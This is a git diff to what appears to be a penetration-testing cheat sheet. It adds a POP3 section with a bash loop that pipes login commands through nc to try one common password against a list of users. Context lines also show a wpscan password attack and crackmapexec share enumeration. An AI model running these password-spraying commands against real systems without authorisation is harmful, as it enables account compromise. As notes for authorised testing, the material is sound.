@@ -631,6 +631,14 @@ wpscan --url http://<IP>/ --password-attack wp-login -U admin -P /usr/share/word
     
 - Enumerating shares: `crackmapexec smb $TARGET --shares`
 
+## TCP Port 110/995 (POP3)
+
+```bash
+for user in $(cat users.txt); 
+do ( echo USER ${user}; sleep 2s; echo PASS password; sleep 2s; echo LIST; sleep 2s; echo quit) | nc -nvC $IP 110;
+done
+```
+
 ## TCP Port 389 (LDAP)
 
 - `ldapsearch -h <IP> -x -s base namingcontexts`
